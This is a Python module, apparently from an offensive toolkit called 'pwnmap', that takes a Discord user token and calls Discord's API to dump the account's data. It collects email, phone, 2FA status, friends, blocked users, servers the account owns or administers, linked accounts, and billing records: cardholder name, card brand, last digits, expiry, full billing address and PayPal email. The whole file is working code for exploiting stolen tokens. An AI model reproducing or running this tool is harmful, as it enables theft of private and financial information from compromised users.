import requests
import time

from typing import Union

from pwnmap.logger import Logger
from pwnmap.module import Module
from pwnmap.util import PrintUtil
from pwnmap.type import DiscordToken


class pwnmapModule(Module):
    description = 'Get Discord account information by token'
    author = 'evan'
   

    def execute(self, token: DiscordToken):
        headers = {'Authorization': token}

        res = requests.get('https://discordapp.com/api/v9/users/@me', headers=headers)

        if res.status_code != 200:
            raise Exception('Invalid token')

        profile = res.json()

        friends, blocked, _ = self.__get_relationships(headers)
        servers, admin_servers = self.__get_servers(headers)

        Logger.info('Account information')
        PrintUtil.pp({
            'Username'          : profile['username'] + '#' + profile['discriminator'],
            'ID'                : profile['id'],
            'Email'             : profile.get('email'),
            'Phone number'      : profile.get('phone'),
            'Creation date'     : time.strftime('%d-%m-%Y %H:%M:%S', time.localtime(((int(profile['id']) >> 22) + 1420070400000) / 1000)),
            'Bio'               : profile['bio'],
            'Locale'            : profile['locale'],
            '2FA enabled'       : profile['mfa_enabled'],
            'Verified'          : profile['verified'],
            'Server booster'    : profile.get('purchased_flags', -1) != -1,
            '+18 account'       : profile['nsfw_allowed'],
            'Nitro'             : bool(profile.get('premium_type')),
            'Nitro type'        : 'Nitro Classic' if profile.get('premium_type') == 1 else 'Nitro' if profile.get('premium_type') == 2 else None,
            'Friends'           : len(friends),
            'Blocked users'     : len(blocked),
            'Servers'           : len(servers),
            'Special servers'   : admin_servers,
            'Badges'            : self.__get_badges(profile['flags']),
            'Connections'       : self.__get_connections(headers),
            'Friend suggestions': self.__get_friend_suggestions(headers),
        })

        for billing_type, billing_info in self.__get_billing_info(headers):
            Logger.nl()
            Logger.info(f'Billing information: {billing_type}')

            PrintUtil.pp(billing_info)

    def __get_friend_suggestions(self, headers: dict) -> list[dict]:
        """ Get friends suggestions """
        res = requests.get('https://discordapp.com/api/v9/friend-suggestions', headers=headers)

        users = []

        for user_info in res.json():
            user = {
                'username': user_info['suggested_user']['username'] + '#' + user_info['suggested_user']['discriminator'],
                'ID': user_info['suggested_user']['id'],
                'Reason': user_info['reasons'][0]['platform_type'],
                'Name': user_info['reasons'][0]['name'] or ''
            }

            users.append(user)

        return users

    def __get_relationships(self, headers: dict) -> tuple[list[dict]]:
        """ Get account relationships """
        res = requests.get('https://discord.com/api/v9/users/@me/relationships', headers=headers)

        blocked = []
        friends = []
        pending = []

        for user in res.json():
            if user['type'] == 1:
                friends.append(user)

            elif user['type'] == 2:
                blocked.append(user)

            elif user['type'] == 4:
                pending.append(user)

        return friends, blocked, pending

    def __get_servers(self, headers: dict) -> tuple[list[dict]]:
        """ Get account servers """
        res = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=headers)

        admin_servers = []

        for server in res.json():
            if server['owner'] is True:
                server_info = {
                    'Name'      : server['name'],
                    'ID'        : server['id'],
                    'Permission': 'owner'
                }

                admin_servers.append(server_info)

            elif (1 << 3) & int(server['permissions']) == (1 << 3):
                server_info = {
                    'Name'      : server['name'],
                    'ID'        : server['id'],
                    'Permission': 'administrator'
                }

                admin_servers.append(server_info)

        return res.json(), admin_servers

    def __get_connections(self, headers: dict) -> list[dict]:
        """ Get account connections """
        res = requests.get('https://discordapp.com/api/v9/users/@me/connections', headers=headers)

        connections = []

        for conn in res.json():
            conn_info = {
                'Platform'  : conn['type'].title(),
                'Name'      : conn['name'],
                'ID'        : conn['id']
            }

            connections.append(conn_info)

        return connections

    def __get_badges(self, flags: int) -> list[str]:
        """ Get badges from flags """
        BADGES = {
            1 << 0:  'Discord Employee',
            1 << 1:  'Partnered Server Owner',
            1 << 2:  'HypeSquad Events',
            1 << 3:  'Bug Hunter Level 1',
            1 << 6:  'House Bravery',
            1 << 7:  'House Brilliance',
            1 << 8:  'House Balance',
            1 << 9:  'Early Supporter',
            1 << 10: 'Team User',
            1 << 12: 'System',
            1 << 14: 'Bug Hunter Level 2',
            1 << 16: 'Verified Bot',
            1 << 17: 'Early Verified Bot Developer',
            1 << 18: 'Discord Certified Moderator'
        }

        badges = []

        for badge_flag, badge_name in BADGES.items():
            if flags & badge_flag == badge_flag:
                badges.append(badge_name)

        return badges

    def __get_billing_info(self, headers: dict) -> bool:
        """ Get billing information """
        CC_DIGITS = {
            'american express'  : '3',
            'visa'              : '4',
            'mastercard'        : '5'
        }

        def _generate_cc_hint(cc_first: Union[int, str], cc_last: int) -> str:
            cc_hint = cc_first + ('*' * 11) + cc_last

            cc_hint_spaced = ''

            for i, n in enumerate(cc_hint):
                cc_hint_spaced += n

                if (i + 1) % 2 == 0:
                    cc_hint_spaced += ' '

            return cc_hint_spaced

        res = requests.get('https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers=headers)

        for billing in res.json():
            addr = billing['billing_address']

            name = addr['name']
            address_1 = addr['line_1']
            address_2 = addr['line_2']
            city = addr['city']
            postal_code = addr['postal_code']
            state = addr['state']
            country = addr['country']

            is_valid = not billing['invalid']
            default_payment_method = billing['default']

            if billing['type'] == 1:
                cc_brand = billing['brand']

                cc_first = CC_DIGITS.get(cc_brand, '*')
                cc_last = billing['last_4']

                cc_month = str(billing['expires_month'])
                cc_year = str(billing['expires_year'])

                yield 'Credit Card', {
                    'CC holder name': name,
                    'CC brand'      : cc_brand.title(),
                    'CC number'     : _generate_cc_hint(cc_first, cc_last),
                    'CC expiry date': ('0' + cc_month if len(cc_month) < 2 else cc_month) + '/' + cc_year[2:4],
                    'Valid'         : is_valid,
                    'Address 1'     : address_1,
                    'Address 2'     : address_2,
                    'City'          : city,
                    'Postal code'   : postal_code,
                    'State'         : state,
                    'Country'       : country,
                    'Auto pay'      : default_payment_method
                }

            elif billing['type'] == 2:
                paypal_email = billing['email']

                yield 'PayPal', {
                    'PayPal name'   : name,
                    'PayPal email'  : paypal_email,
                    'Valid'         : is_valid,
                    'Address 1'     : address_1,
                    'Address 2'     : address_2,
                    'City'          : city,
                    'Postal code'   : postal_code,
                    'State'         : state,
                    'Country'       : country,
                    'Auto pay'      : default_payment_method
                }

            else:
                Logger.warning(billing)